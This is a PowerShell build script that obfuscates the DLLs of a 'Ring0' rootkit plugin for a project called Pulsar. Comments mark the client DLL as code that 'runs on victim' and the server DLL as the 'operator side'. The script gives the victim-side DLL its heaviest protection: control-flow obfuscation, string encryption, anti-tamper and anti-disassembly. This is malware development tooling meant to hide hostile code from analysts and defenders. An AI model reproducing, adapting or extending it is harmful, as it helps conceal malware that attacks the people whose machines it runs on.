# ============================================================
# RINGW0RM DLL Obfuscation Script (PowerShell)
# HARDENED settings for maximum protection
# ============================================================

$ErrorActionPreference = "SilentlyContinue"

$ProjectDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$Reactor = Join-Path $ProjectDir "Obfuscator\dotNET_Reactor.Console.exe"
$Output = Join-Path $ProjectDir "plugins"
$BackupDir = Join-Path $ProjectDir "plugins_unobfuscated"

Write-Host "[OBFUSCATE] Starting..."

# Check if Reactor exists
if (-not (Test-Path $Reactor)) {
    Write-Host "[OBFUSCATE] WARNING: dotNET_Reactor not found at $Reactor"
    Write-Host "[OBFUSCATE] Skipping obfuscation - DLLs will be unprotected"
    exit 0
}

# Check for skip flag
if ($env:SKIP_OBFUSCATION -eq "1") {
    Write-Host "[OBFUSCATE] Skipping obfuscation (SKIP_OBFUSCATION=1)"
    exit 0
}

Write-Host "============================================================"
Write-Host " DLL Obfuscation (HARDENED Mode)"
Write-Host "============================================================"

# Create backup directory
if (-not (Test-Path $BackupDir)) {
    New-Item -ItemType Directory -Path $BackupDir -Force | Out-Null
}

# Define DLLs to obfuscate
$ClientSource = Join-Path $ProjectDir "Pulsar.Plugin.Ring0.Client\bin\Release\net48\Pulsar.Plugin.Ring0.Client.dll"
$CommonSource = Join-Path $ProjectDir "Pulsar.Plugin.Ring0.Common\bin\Release\net48\Pulsar.Plugin.Ring0.Common.dll"
$ServerSource = Join-Path $ProjectDir "Pulsar.Plugin.Ring0.Server\bin\Release\net9.0-windows\Pulsar.Plugin.Ring0.Server.dll"

# Backup unobfuscated versions
Copy-Item $ClientSource $BackupDir -Force -ErrorAction SilentlyContinue
Copy-Item $CommonSource $BackupDir -Force -ErrorAction SilentlyContinue
Copy-Item $ServerSource $BackupDir -Force -ErrorAction SilentlyContinue
Write-Host "   Unobfuscated backups saved to: $BackupDir"

# ============================================================
# Obfuscate Client DLL (MAXIMUM protection - runs on victim)
# Anti-tamper, control flow, necrobit for license protection
# ============================================================
Write-Host ""
Write-Host "[1/3] Obfuscating Client DLL..."
$ClientTarget = Join-Path $Output "Pulsar.Plugin.Ring0.Client.dll"

$process = Start-Process -FilePath $Reactor -ArgumentList @(
    "-file", "`"$ClientSource`"",
    "-targetfile", "`"$ClientTarget`"",
    "-obfuscation", "1",
    "-stringencryption", "1",
    "-control_flow", "1",
    "-flow_level", "5",
    "-necrobit", "0",
    "-antitamp", "1",
    "-anti_ildasm", "1",
    "-resourceencryption", "0",
    "-q",
    "-nodialog"
) -NoNewWindow -PassThru -Wait

if ($process.ExitCode -ne 0) {
    Write-Host "   ERROR: Client obfuscation failed (exit code $($process.ExitCode))"
    Write-Host "   Falling back to unobfuscated version..."
    Copy-Item (Join-Path $BackupDir "Pulsar.Plugin.Ring0.Client.dll") $Output -Force
}
else {
    Write-Host "   Client.dll obfuscated successfully"
}

# ============================================================
# Common DLL - DO NOT OBFUSCATE
# Contains MessagePack-serialized types (RootkitStatus, etc.)
# Must keep original type names for serialization to work
# ============================================================
Write-Host ""
Write-Host "[2/3] Copying Common DLL (NO obfuscation - MessagePack types)..."
$CommonTarget = Join-Path $Output "Pulsar.Plugin.Ring0.Common.dll"

Copy-Item $CommonSource $CommonTarget -Force
Write-Host "   Common.dll copied (unobfuscated - required for MessagePack)"

# ============================================================
# Obfuscate Server DLL (Medium protection - operator side)
# ============================================================
Write-Host ""
Write-Host "[3/3] Obfuscating Server DLL..."
$ServerTarget = Join-Path $Output "Pulsar.Plugin.Ring0.Server.dll"

$process = Start-Process -FilePath $Reactor -ArgumentList @(
    "-file", "`"$ServerSource`"",
    "-targetfile", "`"$ServerTarget`"",
    "-obfuscation", "1",
    "-stringencryption", "1",
    "-control_flow", "0",
    "-necrobit", "0",
    "-antitamp", "0",
    "-q",
    "-nodialog"
) -NoNewWindow -PassThru -Wait

if ($process.ExitCode -ne 0) {
    Write-Host "   ERROR: Server obfuscation failed"
    Copy-Item (Join-Path $BackupDir "Pulsar.Plugin.Ring0.Server.dll") $Output -Force
}
else {
    Write-Host "   Server.dll obfuscated successfully"
}

Write-Host ""
Write-Host "============================================================"
Write-Host " Obfuscation Complete"
Write-Host "============================================================"
Write-Host " Protected DLLs in: $Output"
Write-Host " Backups in: $BackupDir"
Write-Host "============================================================"

exit 0
